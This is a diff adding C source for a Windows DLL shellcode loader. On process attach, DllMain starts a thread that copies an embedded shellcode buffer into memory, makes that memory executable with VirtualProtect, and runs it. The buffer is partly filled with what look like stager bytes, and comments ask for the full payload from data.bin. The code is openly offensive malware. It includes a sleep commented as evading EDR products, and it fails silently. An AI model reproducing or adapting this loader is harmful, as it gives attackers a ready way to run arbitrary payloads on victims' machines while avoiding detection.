@@ -1,0 +1,53 @@
+#include <windows.h>
+
+// Include your binary shellcode (convert data.bin to hex array)
+unsigned char buf[] = 
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+// ... (replace with your actual shellcode from data.bin, converted to hex)
+"\x48\x89\xc7\xe2\x8d\x59\x41\x58\x5e\x5a\x48\x8b\x12\xe9\x57"
+"\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48"
+// ... (ensure full shellcode from data.bin is pasted here)
+;
+
+void run_payload() {
+    // Allocate read/write memory
+    LPVOID exec_mem = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (exec_mem == NULL) {
+        return; // Silent failure
+    }
+    
+    // Copy shellcode to memory
+    memcpy(exec_mem, buf, sizeof(buf));
+    
+    // Change memory to executable
+    DWORD oldProtect;
+    if (!VirtualProtect(exec_mem, sizeof(buf), PAGE_EXECUTE_READ, &oldProtect)) {
+        VirtualFree(exec_mem, 0, MEM_RELEASE);
+        return; // Silent failure
+    }
+    
+    // Small delay to evade some EDRs
+    Sleep(100);
+    
+    // Execute shellcode
+    ((void(*)())exec_mem)();
+    
+    // Clean up memory
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            // Run payload in a new thread for evasion and stability
+            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_payload, NULL, 0, NULL);
+            if (hThread) {
+                CloseHandle(hThread);
+            }
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
